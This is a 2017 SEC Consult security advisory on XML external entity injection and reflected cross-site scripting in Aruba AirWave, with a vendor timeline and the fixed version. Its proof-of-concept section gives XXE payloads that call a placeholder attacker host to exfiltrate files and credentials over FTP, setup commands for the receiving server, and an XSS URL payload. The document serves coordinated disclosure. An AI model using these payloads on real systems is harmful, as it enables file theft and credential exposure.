@@ -1,0 +1,226 @@
+SEC Consult Vulnerability Lab Security Advisory < 20170301-0 >
+=======================================================================
+              title: XML External Entity Injection (XXE),
+                     Reflected Cross Site Scripting
+            product: Aruba AirWave
+ vulnerable version: <=8.2.3
+      fixed version: 8.2.3.1
+         CVE number: CVE-2016-8526, CVE-2016-8527
+             impact: high
+           homepage: http://www.arubanetworks.com/
+              found: 2016-11-21
+                 by: P. Morimoto (Office Bangkok)
+                     SEC Consult Vulnerability Lab 
+
+                     An integrated part of SEC Consult
+                     Bangkok - Berlin - Linz - Luxembourg - Montreal - Moscow
+                     Kuala Lumpur - Singapore - Vienna (HQ) - Vilnius - Zurich
+
+                     https://www.sec-consult.com
+=======================================================================
+
+Vendor description:
+-------------------
+"Aruba, a Hewlett Packard Enterprise company, (formerly "Aruba Networks, Inc.")
+is a networking vendor selling enterprise wireless LAN and edge access
+networking equipment. The company has over 1,800 employees and is
+headquartered in Sunnyvale, California. Aruba's core products are access points
+(APs), mobility controllers, and network management software through their
+Airwave Management Platform product."
+
+Source: https://en.wikipedia.org/wiki/Aruba_Networks
+
+
+Business recommendation:
+------------------------
+SEC Consult recommends not to use the product in a production environment
+until a thorough security review has been performed by security professionals
+and all identified issues have been resolved.
+
+
+Vulnerability overview/description:
+-----------------------------------
+1) XML External Entity Injection (CVE-2016-8526)
+The used XML parser is resolving external XML entities which allows attackers
+to read files and send requests to systems on the internal network (e.g port
+scanning). 
+
+The vulnerability can be exploited by a low privileged read-only user 
+to read sensitive information / files with malicious XML code.
+Note that as Aruba's passwords are encrypted with a shared static key, 
+privilege escalation to admin role is also possible!
+
+Multiple different functions are affected by XXE.
+
+According to the vendor another researcher has also found one of the XXE issues, hence
+credits go to them as well.
+Vendor: "Although the team hasn't reproduced this yet, I’ve had other reports
+come in through our bug bounty program last month about XXE issues in VisualRF.
+One of the issues you reported is the same, and you reported three others that we
+haven't seen yet."
+
+
+2) Reflected Cross Site Scripting (CVE-2016-8527)
+Due to the lack of input validation, an attacker can insert malicious JavaScript
+code to be executed under a victim's browser context. 
+
+
+Proof of concept:
+-----------------
+1) XML External Entity Injection (CVE-2016-8526)
+a) XXE in VisualRF Backup Sites
+
+Login as any user role (including read-only/standard user) 
+Navigate to VisualRF > Floor Plans > Select 'View' under 'Network' section.
+Select a campus (e.g. Default Campus) > Select 'Edit' > 
+Select action 'Export Floor Plans' > Ok
+
+POST /visualrf/backup_sites HTTP/1.1
+Host: <AirWaveHost>
+[...]
+
+xml=<?xml version="1.0" encoding="UTF-8" ?><!DOCTYPE x [<!ENTITY %25 foo SYSTEM "http://<AttackerHost>:1234/sectest.dtd">%25%66%6f%6f%3b%25%70%61%72%61%6d%31%3b]><visualrf:sites xmlns:visualrf="http://www.airwave.com/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" version="1">%26%65%78%66%69%6c%3b</visualrf:sites>
+
+$ cat sectest.dtd
+<!ENTITY % data SYSTEM "file:///<removed>">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ftp://<Attacker>:2121/%data;'>">
+
+$ python -m SimpleHTTPServer 1234
+$ wget https://raw.githubusercontent.com/ONsec-Lab/scripts/master/xxe-ftp-server.rb
+$ ruby xxe-ftp-server.rb
+FTP. New client connected
+< USER anonymous
+< PASS Java1.8.0_102@
+> 230 more data please!
+< TYPE I
+> 230 more data please!
+< CWD [General]
+[...]
+< ; set global WLC credentials
+> 230 more data please!
+< wlc_user: <username>
+> 230 more data please!
+< wlc_pasw: <password>
+[...]
+
+b) XXE in Visual RF Site Restore 
+$ cat version.xml
+   <?xml version="1.0" encoding="UTF-8" standalone="no"?>
+   <!DOCTYPE x [<!ENTITY % foo SYSTEM "http://<AttackerHost>:1234/version.dtd">%foo;%param1;]>
+   &exfil;<backup backup-time="Mon Nov 21 14:44:41 CET 2016" build="${svn.build}" plan-mode="false" version="8.0.0"/>
+
+$ zip backup_sectest.zip version.xml
+  adding: version.xml (deflated 16%)
+
+And then just upload the backup_sectest.zip via the restore functionality.
+
+POST /nf/visualrf_siterestore HTTP/1.1
+Host: <AirWaveHost>
+[...]
+
+------WebKitFormBoundaryjPK7DdVbiNVDEJ2A
+Content-Disposition: form-data; name="zip"; filename="backup_sectest.zip"
+Content-Type: application/zip
+
+[.. backup_sectest.zip ..]
+------WebKitFormBoundaryjPK7DdVbiNVDEJ2A
+Content-Disposition: form-data; name="import"
+
+Import
+------WebKitFormBoundaryjPK7DdVbiNVDEJ2A--
+
+
+c) XXE in Visual RF Verify
+POST /visualrf/verify/<Site-ID> HTTP/1.1
+Host: <AirWaveHost>
+[...]
+
+<?xml version="1.0" encoding="UTF-8" ?><!DOCTYPE x [<!ENTITY % foo SYSTEM "http://<AttackerHost>:1234/sectest.dtd">%foo;%param1;]><visualrf:sites xmlns:visualrf="http://www.airwave.com/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" version="1"><site 
+[...]
+/>&exfil;</site></visualrf:sites>
+
+
+2) Reflected Cross Site Scripting (CVE-2016-8527)
+Note that the XSS payload can be used with either HTTP parameter 'start' or 'end'.
+
+GET /visualrf/group_list.xml?aps=1&start=%3ca%20xmlns%3aa%3d'http%3a%2f%2fwww.w3.org%2f1999%2fxhtml'%3e%3ca%3abody%20onload%3d'alert(/XSS/)'%2f%3e%3c%2fa%3e&end=500&match HTTP/1.1
+Host: <AirWaveHost>
+
+[...]
+HTTP/1.1 200 OK
+[...]
+
+<?xml version='1.0' encoding='UTF-8' standalone='yes'?>
+<results>
+  <error>For input string: "<a xmlns:a='http://www.w3.org/1999/xhtml'><a:body onload='alert(/XSS/)'/></a>"</error>
+</results>
+
+
+
+Vulnerable / tested versions:
+-----------------------------
+The following versions are affected by the identified vulnerabilities which 
+were the most recent versions at the time of discovery:
+Aruba AirWave version <8.2.3.1
+
+
+Vendor contact timeline:
+------------------------
+2016-11-23: Contacting vendor through aruba-sirt@hpe.com
+2016-11-23: Vendor: Established communication over encrypted channel and asked
+            for extending the disclosure date due to the upcoming holidays
+2017-01-18: CVE-2016-8526 was assigned for the XXE issue, and CVE-2016-8527 for
+            the reflected XSS issue.
+2017-02-21: Aruba AirWave 8.2.3.1 was released.
+2017-03-01: Coordinated disclosure of the security advisory. 
+
+
+Solution:
+---------
+Update to version 8.2.3.1 or later.
+
+http://www.arubanetworks.com/assets/alert/ARUBA-PSA-2017-001.txt
+https://support.arubanetworks.com/Documentation/tabid/77/DMXModule/512/EntryId/23738/Default.aspx
+
+
+Workaround:
+-----------
+None
+
+
+Advisory URL:
+-------------
+https://www.sec-consult.com/en/Vulnerability-Lab/Advisories.htm
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+SEC Consult Vulnerability Lab
+
+SEC Consult
+Bangkok - Berlin - Linz - Luxembourg - Montreal - Moscow
+Kuala Lumpur - Singapore - Vienna (HQ) - Vilnius - Zurich
+
+About SEC Consult Vulnerability Lab
+The SEC Consult Vulnerability Lab is an integrated part of SEC Consult. It
+ensures the continued knowledge gain of SEC Consult in the field of network
+and application security to stay ahead of the attacker. The SEC Consult
+Vulnerability Lab supports high-quality penetration testing and the evaluation
+of new offensive and defensive technologies for our customers. Hence our
+customers obtain the most current information about vulnerabilities and valid
+recommendation about the risk profile of new technologies.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Interested to work with the experts of SEC Consult?
+Send us your application https://www.sec-consult.com/en/Career.htm
+
+Interested in improving your cyber security with the experts of SEC Consult? 
+Contact our local offices https://www.sec-consult.com/en/About/Contact.htm
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Mail: research at sec-consult dot com
+Web: https://www.sec-consult.com
+Blog: http://blog.sec-consult.com
+Twitter: https://twitter.com/sec_consult
+
+EOF Pichaya Morimoto / @2017
